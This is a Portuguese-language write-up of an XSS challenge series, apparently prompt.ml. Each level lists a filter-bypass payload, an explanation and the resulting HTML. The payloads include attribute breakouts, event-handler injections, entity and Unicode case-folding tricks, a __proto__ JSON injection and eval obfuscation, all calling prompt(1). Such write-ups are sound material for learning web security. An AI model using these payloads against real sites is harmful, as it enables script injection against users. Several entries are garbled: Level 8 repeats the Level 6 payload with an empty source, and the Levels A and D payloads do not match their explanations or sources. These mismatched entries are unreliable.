![image](https://github.com/user-attachments/assets/c07d2c64-0365-4938-875e-bdb428fea62a)

Input:
```
"><script>prompt(1)</script>
```

Description:
O atributo value seja fechado com " — você escapou a string.

O campo de input se feche com >.

O navegador interprete o restante como HTML válido, e execute o script.

HTML source:
```
<input type="text" value=""><script>alert(1)</script>">
```

-----

![image](https://github.com/user-attachments/assets/40ee93b5-5a4a-42fb-96b7-886521db43d7)

Input:
```
<img src=x onerror=prompt(1)//
```

Description:
Por conta do filtro não da para abrir e fechar o construtor do javascript (<>), com isso, podemos apenas abrir <, dar uma imagem que tem como referência x, no entanto essa imagem não existe, logo, ela dará erro e o erro que foi indicado foi o próprio prompt(1), o restante do input (//) serve para comentar o restante da linha, com isso o fechamento do <article> não acontece, e o HTML fecha sozinho o >, após isso ele finaliza o <article> também.

HTML source:
```
<article><img src=x onerror=prompt(1)//</article>
```

-----

![image](https://github.com/user-attachments/assets/1961c834-7137-4764-b43b-076a91695485)

Input:
```
<svg><script>prompt&#40;1)</script>
```

Description:
O navegador interpreta o conteúdo dentro de <svg> como XML/HTML, então aceita <script> lá dentro.

Uma entidade HTML: &#40; → que representa (.

Como ( está sendo filtrado, mas &#40; não é o caractere real, o filtro não detecta e não remove essa entidade.

Quando o HTML é renderizado pelo navegador, &#40; é convertido de volta para ( — isso é comportamento normal do parser HTML.

HTML source:
```
<svg><script>prompt&#40;1)</script>
```

-----

![image](https://github.com/user-attachments/assets/c45de787-add9-4100-afa2-05661fd71948)

Input:
```
--!> <img src=x onerror=prompt(1)
```

Outra forma de fecha comentário em HTML é usando --!>.

HTML source:
```
<!-- --!> <img src=x onerror=prompt(1) -->
```

-----

![image](https://github.com/user-attachments/assets/9e2f2d74-e28a-4ce2-81af-a14399681a10)

-----

![image](https://github.com/user-attachments/assets/41260ad4-96ca-4920-82e4-d14b137026db)

Input:
```
"type=image src onerror
="prompt(1)
```

Description:
O payload funciona porque o " fecha o atributo value, permitindo injetar novos atributos no <input>. O type=image faz o navegador tentar carregar uma imagem, e o src (mesmo sem valor) ativa esse carregamento. Como a imagem não existe, ocorre um erro que dispara o onerror. A quebra de linha entre onerror e = serve para burlar o filtro regex, que só detecta on...= na mesma linha.

HTML source:
```
<input value=""type=image src onerror
="prompt(1)" type="text">
```

-----

![image](https://github.com/user-attachments/assets/cb66fc90-8b07-4e5e-9ea1-fc58f5b9e319)

Input:
```
javascript:prompt(1)#{"action":1}
```

Description:
O payload funciona porque javascript:prompt(1) define o action do formulário como código JavaScript executável. O #{"action":1} garante que o JSON seja válido e o código não quebre. O filtro tenta bloquear apenas script: e data:, mas esquece de incluir javascript:, permitindo o bypass. Quando form.submit() é chamado, o navegador executa o código no action.

HTML source:
```
<form action="javascript:prompt(1)" method="post"><input name="actio" value="1"></form>                         
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script>
```

-----

![image](https://github.com/user-attachments/assets/19a64242-8781-4c49-a1a7-8aa5e452499c)

Input:
```
"><svg/a=#"onload='/*#*/prompt(1)'
```

Description: No Level 7, a entrada é dividida em segmentos de no máximo 12 caracteres. O truque é manipular esses segmentos para fechar tags HTML e iniciar um script em sequência, injetando um código JavaScript com prompt(1). Uma das soluções envolve o uso de <svg> e <script> com manipuladores de eventos para combinar as partes e garantir a execução do código.

HTML source:
```
<p class="comment" title=""><svg/a="></p>
<p class="comment" title=""onload='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```

-----

![image](https://github.com/user-attachments/assets/1acbc0ce-b7a3-44fd-9310-42dd26aca31e)

Input:
```
javascript:prompt(1)#{"action":1}
```

Description: Neste nível, temos que contornar a remoção de quebras de linha e comente o código de forma a permitir a execução. A técnica envolve usar os separadores de linha Unicode, como U+2028 (separador de parágrafo), que não são filtrados. A solução é injetar o código prompt(1) usando esses caracteres como separadores, permitindo que o código seja executado sem ser filtrado.

HTML source:
```

```

-----

![image](https://github.com/user-attachments/assets/904e735c-975a-4988-b81c-b508d99f321e)

Input:
```
<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
```

Description: O Level 9 lida com a transformação de letras usando a função toUpperCase(). O truque é que alguns caracteres Unicode, como ſ, quando convertidos para maiúsculas, se transformam em um caractere ASCII equivalente. Isso permite que se manipule tags HTML de forma a contornar o filtro de tags, como o uso de <ſvg> e <ſcript>.

HTML source:
```
<h1><SVG/ONLOAD=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;></h1>
```

-----

![image](https://github.com/user-attachments/assets/1e1649d2-f8db-481a-a3df-142d4f578056)

Input:
```
p'rompt(1)
```

Description: No A, o filtro remove a palavra prompt e também impede o uso de apóstrofos '. A solução é dividir a palavra prompt de forma que ela ainda seja válida em JavaScript, como p'rompt(1), que é processada corretamente. Essa técnica contorna as regras de filtragem, mantendo o código funcional.

HTML source:
```
<script>prompt(1)</script>
```

-----

![image](https://github.com/user-attachments/assets/41a629b0-899a-4417-93e5-2676c6edabbc)

Input:
```
"(prompt(1))in"
```

Description: No B, a dificuldade está em contornar a falta de operadores especiais para concatenar strings e criar código dinâmico. A solução aqui é usar um operador alfanumérico, como o in, que pode ser utilizado para combinar a string desejada sem usar operadores proibidos. A solução envolve injetar código com o uso de in para criar uma expressão válida.

HTML source:
```
<script>                                    
    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
    if (data.action === "login")            
        document.write(data.message)        
</script>
```

-----

![image](https://github.com/user-attachments/assets/54ac5579-6d9c-428b-8dda-bd5389198186)

Input:
```
eval(630038579..toString(30))(1)
```

Description: O C envolve um filtro que codifica a entrada com a função encodeURIComponent(), o que impede o uso de muitos caracteres. A solução aqui envolve a conversão de texto para números usando o método toString() com a base 36 (ou base 30), permitindo que a string prompt seja convertida em um número, que pode ser avaliado como JavaScript. O truque é usar uma base suficientemente alta para cobrir todos os caracteres necessários.

HTML source:
```
<script>eval(630038579..toString(30))(1)</script>
```

-----

![image](https://github.com/user-attachments/assets/69da3e2a-9b60-488d-ba2d-9f68b19b7bf4)

Input:
```
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```

Description: No D, a tarefa é manipular um objeto JSON e contornar as limitações de segurança. O truque aqui é usar a propriedade __proto__ do objeto JSON, que pode ser manipulada para redefinir o valor da chave source e injetar código malicioso. A solução envolve explorar o comportamento de getter/setter do __proto__ para contornar as validações e injetar código JavaScript.

HTML source:
```
<img src="<img src="onerror=prompt(1)>">
```

-----

![image](https://github.com/user-attachments/assets/36392822-ed9c-4edf-bc35-8aa9d27ceda8)

-----

![image](https://github.com/user-attachments/assets/9f2feeb0-98cb-45c3-bc24-d111dc94f0dc)

Input:
```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
```

Description: No F, a entrada é dividida em segmentos de no máximo 15 caracteres. A técnica aqui é usar comentários HTML (<!-- -->) dentro de tags SVG para ocultar partes do código e injetar prompt(1) de maneira disfarçada. A solução envolve dividir o código em segmentos e usar comentários HTML e tags SVG para contornar as limitações de tamanho e manipulação de caracteres.

HTML source:
```
<input type="text" value=""><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>">
```

-----
